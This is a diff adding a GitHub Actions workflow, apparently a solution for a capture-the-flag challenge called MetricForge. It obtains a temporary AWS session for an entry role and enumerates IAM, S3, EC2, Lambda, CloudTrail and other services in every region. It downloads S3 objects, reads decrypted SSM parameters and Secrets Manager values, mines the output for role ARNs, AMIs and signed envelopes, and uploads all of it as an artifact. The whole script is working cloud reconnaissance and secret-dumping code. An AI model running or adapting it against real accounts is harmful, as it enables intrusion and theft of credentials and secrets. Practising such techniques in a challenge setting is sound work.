@@ -1,0 +1,325 @@
+name: MetricForge live recon
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+
+jobs:
+  mint:
+    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
+    with:
+      mode: exchange
+      entry_role: arn:aws:iam::125746528491:role/metricforge-entry-b8358a07fc
+      nonce: participant
+
+  recon:
+    needs: mint
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    permissions:
+      contents: read
+      actions: read
+
+    steps:
+      - name: Download temporary AWS session
+        uses: actions/download-artifact@v4
+        with:
+          name: metricforge-entry-session-participant
+          path: session
+
+      - name: Enumerate the recovery account
+        shell: bash
+        run: |
+          set -u
+          mkdir -p recon/global recon/regions recon/downloads recon/analysis
+
+          SESSION_FILE="$(find session -type f -maxdepth 2 | head -n 1)"
+          test -n "${SESSION_FILE}" || { echo "Session artifact is empty"; exit 1; }
+
+          export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId // .credentials.AccessKeyId // .AccessKeyId // empty' "${SESSION_FILE}")"
+          export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey // .credentials.SecretAccessKey // .SecretAccessKey // empty' "${SESSION_FILE}")"
+          export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken // .credentials.SessionToken // .SessionToken // empty' "${SESSION_FILE}")"
+          export AWS_DEFAULT_REGION=us-east-1
+          export AWS_PAGER=""
+
+          test -n "${AWS_ACCESS_KEY_ID}" || { echo "Could not parse AccessKeyId"; jq 'keys' "${SESSION_FILE}"; exit 1; }
+          echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+          echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+          echo "::add-mask::${AWS_SESSION_TOKEN}"
+
+          run_cmd() {
+            local output="$1"
+            shift
+            {
+              printf 'COMMAND:'
+              printf ' %q' "$@"
+              printf '\n\n'
+              "$@"
+            } >"${output}.stdout" 2>"${output}.stderr" || echo "$?" >"${output}.exit"
+          }
+
+          run_cmd recon/global/sts_identity aws sts get-caller-identity --output json
+          run_cmd recon/global/iam_get_entry_role aws iam get-role --role-name metricforge-entry-b8358a07fc --output json
+          run_cmd recon/global/iam_list_entry_inline aws iam list-role-policies --role-name metricforge-entry-b8358a07fc --output json
+          run_cmd recon/global/iam_list_entry_attached aws iam list-attached-role-policies --role-name metricforge-entry-b8358a07fc --output json
+          run_cmd recon/global/iam_list_roles aws iam list-roles --max-items 1000 --output json
+          run_cmd recon/global/iam_list_instance_profiles aws iam list-instance-profiles --max-items 1000 --output json
+          run_cmd recon/global/s3_list_buckets aws s3api list-buckets --output json
+          run_cmd recon/global/route53_zones aws route53 list-hosted-zones --output json
+          run_cmd recon/global/organizations aws organizations describe-organization --output json
+          run_cmd recon/global/account_aliases aws iam list-account-aliases --output json
+
+          # Fetch the current role's inline and managed policy documents when permitted.
+          if jq -e '.PolicyNames' recon/global/iam_list_entry_inline.stdout >/dev/null 2>&1; then
+            jq -r '.PolicyNames[]' recon/global/iam_list_entry_inline.stdout | while IFS= read -r policy; do
+              safe="$(printf '%s' "${policy}" | tr -c 'A-Za-z0-9_.-' '_')"
+              run_cmd "recon/global/iam_entry_inline_${safe}" \
+                aws iam get-role-policy --role-name metricforge-entry-b8358a07fc --policy-name "${policy}" --output json
+            done
+          fi
+
+          if jq -e '.AttachedPolicies' recon/global/iam_list_entry_attached.stdout >/dev/null 2>&1; then
+            jq -r '.AttachedPolicies[].PolicyArn' recon/global/iam_list_entry_attached.stdout | while IFS= read -r arn; do
+              safe="$(printf '%s' "${arn}" | tr -c 'A-Za-z0-9_.-' '_')"
+              run_cmd "recon/global/iam_managed_${safe}" aws iam get-policy --policy-arn "${arn}" --output json
+              meta="recon/global/iam_managed_${safe}.stdout"
+              version="$(jq -r '.Policy.DefaultVersionId // empty' "${meta}" 2>/dev/null)"
+              if [ -n "${version}" ]; then
+                run_cmd "recon/global/iam_managed_${safe}_${version}" \
+                  aws iam get-policy-version --policy-arn "${arn}" --version-id "${version}" --output json
+              fi
+            done
+          fi
+
+          # Discover enabled regions. Fall back to the common commercial regions if denied.
+          REGIONS="$(aws ec2 describe-regions --all-regions \
+            --query 'Regions[?OptInStatus!=`not-opted-in`].RegionName' \
+            --output text 2>/dev/null || true)"
+          if [ -z "${REGIONS}" ]; then
+            REGIONS="us-east-1 us-east-2 us-west-1 us-west-2 ap-northeast-1 ap-northeast-2 ap-northeast-3 ap-south-1 ap-southeast-1 ap-southeast-2 ca-central-1 eu-central-1 eu-west-1 eu-west-2 eu-west-3 eu-north-1 sa-east-1"
+          fi
+          printf '%s\n' ${REGIONS} > recon/analysis/regions.txt
+
+          for region in ${REGIONS}; do
+            dir="recon/regions/${region}"
+            mkdir -p "${dir}"
+
+            run_cmd "${dir}/ec2_images_owner" aws ec2 describe-images \
+              --region "${region}" --owners 125746528491 --include-deprecated --output json
+            run_cmd "${dir}/ec2_snapshots_owner" aws ec2 describe-snapshots \
+              --region "${region}" --owner-ids 125746528491 --max-results 1000 --output json
+            run_cmd "${dir}/ec2_instances" aws ec2 describe-instances --region "${region}" --output json
+            run_cmd "${dir}/ec2_volumes" aws ec2 describe-volumes --region "${region}" --output json
+            run_cmd "${dir}/ec2_security_groups" aws ec2 describe-security-groups --region "${region}" --output json
+            run_cmd "${dir}/ec2_key_pairs" aws ec2 describe-key-pairs --region "${region}" --output json
+            run_cmd "${dir}/ec2_tags" aws ec2 describe-tags --region "${region}" --max-results 1000 --output json
+
+            run_cmd "${dir}/ssm_parameters" aws ssm describe-parameters \
+              --region "${region}" --max-results 50 --output json
+            run_cmd "${dir}/secrets" aws secretsmanager list-secrets \
+              --region "${region}" --max-results 100 --include-planned-deletion --output json
+            run_cmd "${dir}/lambda_functions" aws lambda list-functions \
+              --region "${region}" --max-items 1000 --output json
+            run_cmd "${dir}/dynamodb_tables" aws dynamodb list-tables \
+              --region "${region}" --output json
+            run_cmd "${dir}/cloudformation_stacks" aws cloudformation describe-stacks \
+              --region "${region}" --output json
+            run_cmd "${dir}/codebuild_projects" aws codebuild list-projects \
+              --region "${region}" --output json
+            run_cmd "${dir}/codepipeline_pipelines" aws codepipeline list-pipelines \
+              --region "${region}" --output json
+            run_cmd "${dir}/ecr_repositories" aws ecr describe-repositories \
+              --region "${region}" --max-results 1000 --output json
+            run_cmd "${dir}/logs_groups" aws logs describe-log-groups \
+              --region "${region}" --limit 50 --output json
+            run_cmd "${dir}/kms_aliases" aws kms list-aliases \
+              --region "${region}" --limit 100 --output json
+            run_cmd "${dir}/sns_topics" aws sns list-topics --region "${region}" --output json
+            run_cmd "${dir}/sqs_queues" aws sqs list-queues --region "${region}" --output json
+            run_cmd "${dir}/backup_vaults" aws backup list-backup-vaults \
+              --region "${region}" --max-results 100 --output json
+            run_cmd "${dir}/imagebuilder_images" aws imagebuilder list-images \
+              --region "${region}" --max-results 100 --output json
+            run_cmd "${dir}/signer_profiles" aws signer list-signing-profiles \
+              --region "${region}" --max-results 100 --output json
+            run_cmd "${dir}/cloudtrail_trails" aws cloudtrail describe-trails \
+              --region "${region}" --include-shadow-trails --output json
+          done
+
+          # Read discoverable S3 objects, capped to small challenge artifacts.
+          if jq -e '.Buckets' recon/global/s3_list_buckets.stdout >/dev/null 2>&1; then
+            jq -r '.Buckets[].Name' recon/global/s3_list_buckets.stdout | while IFS= read -r bucket; do
+              safe_bucket="$(printf '%s' "${bucket}" | tr -c 'A-Za-z0-9_.-' '_')"
+              run_cmd "recon/global/s3_${safe_bucket}_location" \
+                aws s3api get-bucket-location --bucket "${bucket}" --output json
+              run_cmd "recon/global/s3_${safe_bucket}_objects" \
+                aws s3api list-objects-v2 --bucket "${bucket}" --max-keys 200 --output json
+
+              listing="recon/global/s3_${safe_bucket}_objects.stdout"
+              if jq -e '.Contents' "${listing}" >/dev/null 2>&1; then
+                jq -r '.Contents[] | select(.Size <= 2097152) | [.Key, (.Size|tostring)] | @base64' "${listing}" |
+                while IFS= read -r row; do
+                  decoded="$(printf '%s' "${row}" | base64 -d)"
+                  key="$(printf '%s' "${decoded}" | jq -r '.[0]')"
+                  key_hash="$(printf '%s' "${key}" | sha256sum | cut -c1-16)"
+                  mkdir -p "recon/downloads/s3_${safe_bucket}"
+                  aws s3api get-object --bucket "${bucket}" --key "${key}" \
+                    "recon/downloads/s3_${safe_bucket}/${key_hash}.bin" \
+                    >"recon/downloads/s3_${safe_bucket}/${key_hash}.meta.json" \
+                    2>"recon/downloads/s3_${safe_bucket}/${key_hash}.stderr" || true
+                  printf '%s\n' "${key}" >"recon/downloads/s3_${safe_bucket}/${key_hash}.key"
+                done
+              fi
+            done
+          fi
+
+          # Read SSM parameters and Secrets Manager values when the entry role permits it.
+          find recon/regions -name 'ssm_parameters.stdout' -print0 | while IFS= read -r -d '' listing; do
+            region="$(basename "$(dirname "${listing}")")"
+            jq -r '.Parameters[]?.Name' "${listing}" 2>/dev/null | while IFS= read -r name; do
+              safe="$(printf '%s' "${name}" | sha256sum | cut -c1-16)"
+              run_cmd "recon/regions/${region}/ssm_value_${safe}" \
+                aws ssm get-parameter --region "${region}" --name "${name}" --with-decryption --output json
+              printf '%s\n' "${name}" >"recon/regions/${region}/ssm_value_${safe}.name"
+            done
+          done
+
+          find recon/regions -name 'secrets.stdout' -print0 | while IFS= read -r -d '' listing; do
+            region="$(basename "$(dirname "${listing}")")"
+            jq -r '.SecretList[]?.ARN' "${listing}" 2>/dev/null | while IFS= read -r arn; do
+              safe="$(printf '%s' "${arn}" | sha256sum | cut -c1-16)"
+              run_cmd "recon/regions/${region}/secret_value_${safe}" \
+                aws secretsmanager get-secret-value --region "${region}" --secret-id "${arn}" --output json
+              printf '%s\n' "${arn}" >"recon/regions/${region}/secret_value_${safe}.arn"
+            done
+          done
+
+          # Extract useful indicators and every syntactically valid DSSE envelope candidate.
+          python3 - <<'PY'
+          import base64
+          import hashlib
+          import json
+          import re
+          from pathlib import Path
+
+          root = Path("recon")
+          out = root / "analysis"
+          out.mkdir(exist_ok=True)
+
+          blobs = []
+          for path in root.rglob("*"):
+              if not path.is_file() or path.stat().st_size > 5_000_000:
+                  continue
+              try:
+                  data = path.read_bytes()
+              except OSError:
+                  continue
+              blobs.append((path, data))
+
+          text = b"\n".join(data for _, data in blobs)
+          patterns = {
+              "ami_ids": rb"\bami-[0-9a-f]{17}\b",
+              "role_arns": rb"\barn:aws:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_/-]+\b",
+              "bucket_arns": rb"\barn:aws:s3:::[A-Za-z0-9._/-]+\b",
+              "metricforge_lines": rb"(?im)^.*(?:metricforge|recovery|restore|dsse|payload|seed|external.?id).*$",
+          }
+          for name, pattern in patterns.items():
+              values = sorted({m.decode("utf-8", "replace") for m in re.findall(pattern, text)})
+              (out / f"{name}.txt").write_text("\n".join(values) + ("\n" if values else ""))
+
+          candidates = []
+
+          def visit(obj, source, trail="$"):
+              if isinstance(obj, dict):
+                  if {"payloadType", "payload", "signatures"} <= set(obj):
+                      try:
+                          payload = base64.b64decode(obj["payload"], validate=True)
+                          candidates.append({
+                              "source": str(source),
+                              "json_path": trail,
+                              "payloadType": obj["payloadType"],
+                              "signature_count": len(obj.get("signatures", [])),
+                              "payload_sha256": hashlib.sha256(payload).hexdigest(),
+                              "C": hashlib.sha256(payload).hexdigest()[:16],
+                              "payload_utf8": payload.decode("utf-8", "replace"),
+                              "envelope": obj,
+                          })
+                      except Exception as exc:
+                          candidates.append({
+                              "source": str(source),
+                              "json_path": trail,
+                              "error": repr(exc),
+                              "envelope": obj,
+                          })
+                  for k, v in obj.items():
+                      visit(v, source, f"{trail}.{k}")
+              elif isinstance(obj, list):
+                  for i, v in enumerate(obj):
+                      visit(v, source, f"{trail}[{i}]")
+
+          for path, data in blobs:
+              try:
+                  visit(json.loads(data), path)
+              except Exception:
+                  # Some challenge objects may contain a JSON envelope embedded in text.
+                  for m in re.finditer(rb'\{[^{}\n]{0,500}"payloadType"[^{}\n]{0,2000}"signatures"[^{}\n]{0,500}\}', data):
+                      try:
+                          visit(json.loads(m.group(0)), path, "$embedded")
+                      except Exception:
+                          pass
+
+          (out / "dsse_candidates.json").write_text(
+              json.dumps(candidates, ensure_ascii=False, indent=2)
+          )
+
+          images = []
+          for path in root.rglob("ec2_images_owner.stdout"):
+              try:
+                  doc = json.loads(path.read_text())
+              except Exception:
+                  continue
+              region = path.parent.name
+              for image in doc.get("Images", []):
+                  images.append({
+                      "region": region,
+                      "ImageId": image.get("ImageId"),
+                      "Name": image.get("Name"),
+                      "Description": image.get("Description"),
+                      "CreationDate": image.get("CreationDate"),
+                      "Tags": image.get("Tags"),
+                      "BlockDeviceMappings": image.get("BlockDeviceMappings"),
+                  })
+          images.sort(key=lambda x: (x.get("CreationDate") or "", x.get("ImageId") or ""))
+          (out / "ami_inventory.json").write_text(
+              json.dumps(images, ensure_ascii=False, indent=2)
+          )
+          PY
+
+          {
+            echo '=== STS identity ==='
+            cat recon/global/sts_identity.stdout 2>/dev/null || true
+            echo
+            echo '=== AMI inventory ==='
+            cat recon/analysis/ami_inventory.json
+            echo
+            echo '=== MetricForge indicators ==='
+            cat recon/analysis/metricforge_lines.txt
+            echo
+            echo '=== DSSE candidates ==='
+            cat recon/analysis/dsse_candidates.json
+          } > recon/analysis/SUMMARY.txt
+
+          # Do not retain the temporary STS credential in the final recon artifact.
+          rm -rf session
+
+      - name: Upload recon results
+        uses: actions/upload-artifact@v4
+        with:
+          name: metricforge-recon
+          path: recon
+          if-no-files-found: error
+          retention-days: 1
